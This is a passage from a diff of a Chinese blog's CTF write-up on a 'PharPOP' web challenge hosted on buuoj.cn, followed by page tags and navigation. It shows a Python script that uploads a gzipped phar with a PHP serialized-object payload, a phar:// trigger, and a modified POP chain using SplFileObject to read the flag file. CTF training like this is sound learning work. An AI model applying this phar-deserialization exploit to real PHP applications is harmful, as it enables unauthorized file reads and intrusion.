+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gzip</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">&#x27;http://eb42c7e1-21cd-4434-9b23-9481b9df5d0b.node4.buuoj.cn:81/&#x27;</span></span><br><span class="line"></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;F:\脚本\.idea\\filename1.phar&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="comment">#打开文件</span></span><br><span class="line">file_out = gzip.<span class="built_in">open</span>(<span class="string">&quot;./filename1.zip&quot;</span>, <span class="string">&quot;wb+&quot;</span>)<span class="comment">#创建压缩文件对象</span></span><br><span class="line">file_out.writelines(file)</span><br><span class="line">file_out.close()</span><br><span class="line">file.close()</span><br><span class="line"></span><br><span class="line">res = requests.post(</span><br><span class="line">    url,</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="number">1</span>: <span class="string">&#x27;O:1:&quot;D&quot;:2:&#123;s:5:&quot;start&quot;;s:1:&quot;w&quot;;s:6:&quot;rao&quot;;O:1:&quot;D&quot;:1:N;&#125;&#x27;</span>,</span><br><span class="line">        <span class="number">0</span>: <span class="built_in">open</span>(<span class="string">&quot;./filename1.zip&quot;</span>,<span class="string">&#x27;rb&#x27;</span>).read() </span><br><span class="line">    &#125;</span><br><span class="line">) <span class="comment"># 写入</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure></div>
+
+<p>得到phar文件目录</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202311141906346.png"
+                      alt="image-20231114190639238"
+                ></p>
+<h6 id="5、继续传参访问phar"><a href="#5、继续传参访问phar" class="headerlink" title="5、继续传参访问phar"></a>5、继续传参访问phar</h6><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: <span class="string">&#x27;O:1:&quot;D&quot;:2:&#123;s:5:&quot;start&quot;;s:1:&quot;r&quot;;s:6:&quot;rao&quot;;O:1:&quot;D&quot;:1:N;&#125;&#x27;</span>,</span><br><span class="line"><span class="number">0</span>: <span class="string">&#x27;phar:///tmp/da74e6ce7ff2e3a48d021cdff3615bf2.jpg/a.text&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202311141913661.png"
+                      alt="image-20231114191304563"
+                ></p>
+<p>得到flag文件名称：fflaggg</p>
+<h6 id="6、读文件"><a href="#6、读文件" class="headerlink" title="6、读文件"></a>6、读文件</h6><p>步骤和签名基本一致，只需要改成</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$b</span>[<span class="number">0</span>]-&gt;name-&gt;flag = <span class="string">&quot;/fflaggg&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>[<span class="number">0</span>]-&gt;name-&gt;xxx-&gt;p-&gt;act = <span class="string">&quot;splFileObject&quot;</span>;</span><br><span class="line"><span class="comment">//然后再改改文件名称</span></span><br></pre></td></tr></table></figure></div>
+
+<p>得到flag</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202311141756973.png"
+                      alt="image-20231114175618067"
+                ></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://h4cking2thegate.github.io/posts/50824/index.html#%E6%9C%80%E7%BB%88exp" >wp <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+
         </div>
 
         
@@ -359,7 +490,7 @@
         
             <li>
                 <strong>Updated at
-                    :</strong> 2023-11-16 22:34:16
+                    :</strong> 2023-11-16 22:46:52
             </li>
         
         <li>
@@ -382,11 +513,50 @@
         
 
         
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/CTF/">#CTF</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/%E9%9B%86%E8%AE%AD/">#集训</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/web/">#web</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/object-Object/">#[object Object]</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/%E5%AD%A6%E4%B9%A0/">#学习</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
 
         
 
         
             <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="prev"
+                        rel="prev"
+                        href="/2023/11/16/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"
+                        >
+                            <span class="left arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">反序列化</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
                 
                 
                     <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
@@ -456,7 +626,7 @@
     <div class="post-toc">
         <div class="toc-title">On this page</div>
         <div class="page-title">training-7</div>
-        
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#week3-4%EF%BC%884%EF%BC%89"><span class="nav-text">week3-4（4）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#PharPOP"><span class="nav-text">PharPOP</span></a></li></ol></li></ol></li></ol>
 
     </div>
 </div>
